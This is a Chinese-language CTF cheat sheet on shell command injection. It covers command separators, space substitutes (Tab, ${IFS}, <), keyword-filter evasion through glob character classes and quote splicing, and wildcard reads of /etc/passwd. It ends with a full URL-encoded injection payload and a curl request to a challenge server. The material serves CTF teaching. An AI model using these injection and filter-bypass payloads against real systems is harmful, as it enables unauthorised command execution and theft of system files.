## 〇、一句话先建立直觉

**Shell = 你敲命令的那个「命令行解释器」**（Linux 下通常是 bash）。
命令注入题的本质：**你输入的内容被直接拼进了一条 shell 命令**，于是你能往里塞「额外的命令」或「骗过过滤的写法」。

下面所有技巧，都是为了两件事：
1. **让服务器多执行一条命令**（分隔符）；
2. **绕开黑名单**（空格/关键词被拦时，用等价写法替代）。

---

## 一、一眼速查表（做题先贴这儿）

| 你想干的事 | 正常写法 | 被拦时替代写法 | 属于哪类 |
|---|---|---|---|
| 执行多条命令 | `cmd1; cmd2` | `cmd1 & cmd2` / `cmd1 && cmd2` / `cmd1 \|\| cmd2` / `cmd1\ncmd2` | 命令分隔符 |
| 命令间管道 | `a \| b` | 同上，换个没被拦的分隔符 | 命令分隔符 |
| 命令内空格 | `grep . /flag` | `grep<TAB>.<TAB>/flag` / `grep${IFS}.${IFS}/flag` / `grep</flag` | 空格替代品 |
| 关键词被拦 | `cat /flag` | `grep . /[f]lag`（`[f]lag`字符类）/ `" /f"lag ` 拼接 | 关键词绕过 |
| 在脚本里写 Tab | 直接敲 Tab | Python 里写 `\t`，bash 里写 `$'\t'` | 控制字符表示法 |
| 在 URL 里写 Tab | — | `%09` | 控制字符表示法 |
| 在 URL 里写换行 | — | `%0a` | 控制字符表示法 |

## 二、命令分隔符（用来执行多条命令）

> 这一类才是「同时跑多条命令」用的。

| 符号 | 含义 | 例子 |
|---|---|---|
| `;` | 顺序执行，前一条完就跑后一条（不管成败） | `ls; id` |
| `&` | 前一条放后台，两条**同时**跑 | `ls & id` |
| `&&` | 前一条**成功**才跑后一条 | `ls && id` |
| `\|\|` | 前一条**失败**才跑后一条 | `xxx \|\| id` |
| `\|` | 管道：前一条的输出喂给后一条当输入 | `ls \| grep php` |
| 换行 `%0a` | 和 `;` 类似，一行一条命令 | `ls\nid` |

**CTF 套路**：黑名单往往拦了 `;`、`|`、`&&`，却**漏了 `&`**（40567 题就是）。所以测绘时逐个试，找漏网的分隔符。

---

## 三、空格 / 参数分隔替代品（一条命令内部，不是多条命令）

> 这一类**不是**为了跑多条命令，而是 shell 需要用「空白」来区分「命令名」和「参数」。空格被拦时替代它。

| 写法 | 说明 |
|---|---|
| **Tab（`\t`）** | shell 把 Tab 当空白，黑名单常只拦空格漏了 Tab（40567 题用这个） |
| 换行 `%0a` | 有时也能当分隔 |
| `${IFS}` | shell 内部的「字段分隔符」变量，默认就是空格 |
| `${IFS$9}` / `$IFS$9` | `$9` 是空的第9个参数，拼上更稳，常用来躲正则 |
| `<` | 输入重定向符，可顶替空格分隔（如 `cat</flag`） |
| `{cmd,arg}` | bash 大括号展开，`{cat,/flag}` 等价于 `cat /flag` |

**例子**：`grep . /flag` 在空格被拦时 → `grep<TAB>.<TAB>/flag`。

## 四、关键词绕过（根本不是分隔符）

> 黑名单拦了某个「词」（如 `flag`、`cat`），你要在输入里**不出现这个连续词**，但 shell 仍能正确解析。

### 招1：字符类 `[x]`（glob 通配符）
- `[f]` 表示「匹配一个字符 f」。`/[f]lag` 在 shell 眼里 = `/flag`（能找到文件）。
- 但黑名单看到的原始字符串是 `[f]lag`，**里面没有连续的 `flag`** → 放行。
- 同理可写 `[f][l]ag`、`/fl[a]g` 等。

### 招2：引号拼接
- `"/f"lag`、`/f"lag"`、`/f'l'ag` —— shell 拼接后仍是 `/flag`，但字面没有连续 `flag`。
- 注意：若题目连 `(` `)` 引号也拦，拼接法可能失效（40567 题因 `(` `)` 被拦，走的是 grep + 字符类法）。

### 招3：换同义命令（避开被拦的命令名）
- `cat` 被拦 → 用 `tac` / `more` / `less` / `nl` / `sort` / `rev` / `grep . 文件` / `awk` / `sed`。
- `flag` 被拦且没法用字符类时：用通配 `cat /fl*`、`cat /f*`、`grep . /f*`。

### 招4：通配符展开绕「路径黑名单」（★重点）

黑名单拦 `/etc/passwd` 这类完整路径时，用通配符让 **shell 帮你展开**：

```bash
nl /etc/*        # 输入里没有 /etc/passwd 字样 → 放行后才展开成真实路径
nl /etc/pass*    # * 匹配任意字符
nl /etc/pa??wd   # ? 匹配单个字符
```

**原理**：过滤器检查的是「你输入的字符串」，而 `*` 的展开发生在 **shell 内部**（`system()` 调 `/bin/sh` 时才展开）——输入里没有黑名单词 = 放行，展开后的真实路径才喂给 nl。

> ⚠️ 前提：过滤的是「路径字符串」。若连 `etc` 都拦，这招失效，得配变量拼接（`${IFS}` 那些）。

## 五、控制字符（Tab / 换行）怎么「打」出来

> Tab、换行是看不见的控制字符，键盘直接敲会跳焦点/提交，所以要用「记号」表示。

### 方法A：Python 脚本里写 `\t` / `\n`（最推荐）
```python
payload = '.&grep\t.\t/[f]lag'   # \t 在运行时变成真实 Tab 字节
# \n 同理变成真实换行
```
Python 会自动把 `\t`、`\n` 转成实际字节发出去——**你不用手动敲 Tab**。

### 方法B：手动构造 HTTP 请求用「URL 编码」
| 字符 | URL 编码 |
|---|---|
| 空格 | `%20` |
| **Tab** | **`%09`** |
| **换行** | **`%0a`** |
| `/` | `%2F` |
| `&` | `%26`（防止被当参数分隔） |
| `[` | `%5B` |
| `]` | `%5D` |

40567 的 payload 写成 URL 编码就是：
```
directory=.%26grep%09.%09%2F%5Bf%5Dlag
```
curl 例子：
```bash
curl -X POST --data 'directory=.%26grep%09.%09%2F%5Bf%5Dlag' http://challenge.qsnctf.com:40567/index.php
```

### 方法C：Bash 里用 `$'...'`（ANSI-C 引号）
```bash
curl -X POST --data $'directory=.&grep\t.\t/[f]lag' http://...
```
`$'...'` 会把里面的 `\t` `\n` 解释成真实控制字符。

## 六、其他 shell 基础速查（高频但易忘）

| 概念 | 说明 | 例子 |
|---|---|---|
| **glob 通配** | shell 自动展开 `*` `?` `[ ]` | `*.php` 匹配所有 php 文件；`[f]lag` 匹配 flag |
| **单引号 `'`** | 内部内容**原样**，不解释变量/转义 | `'a$b'` 就是字面 `a$b` |
| **双引号 `"`** | 内部**解释变量**，但不解释通配 | `"$HOME"` 展开为家目录 |
| **反引号 `` ` ``** | 把里面命令的输出当字符串用 | `` echo `whoami` `` |
| **`$()`** | 同反引号，更推荐 | `echo $(whoami)` |
| **重定向 `>` / `>>`** | 输出写文件 / 追加写 | `echo a > 1.txt` |
| **重定向 `<`** | 文件内容当命令输入 | `cat < /flag`（也可顶替空格） |
| **后台 `&`** | 命令放后台跑 | `sleep 10 &` |
| **`#` 注释** | 后面内容被忽略 | `id # 注释` |

> 安全提示：很多黑名单会拦 `` ` `` `'` `"` `()` `{` `}` `\` 这些，所以上面有些「正常写法」在 CTF 里反而用不了，要回到第三、四节的替代法。

---

## 七、命令注入绕过「三板斧」总结（背下来）

1. **找漏网的分隔符**：`;` `|` 被拦就试 `&`、`&&`、`||`、换行 `%0a`、反引号、`<`。
2. **空格被拦 → 用 Tab / 换行 / `${IFS}` / `<` 替代**。
3. **关键词被拦（cat / flag / …）→ 用字符类 + 拼接绕**：`/[f]lag` 代替 `/flag`；`cat` 换成 `grep . 文件`。
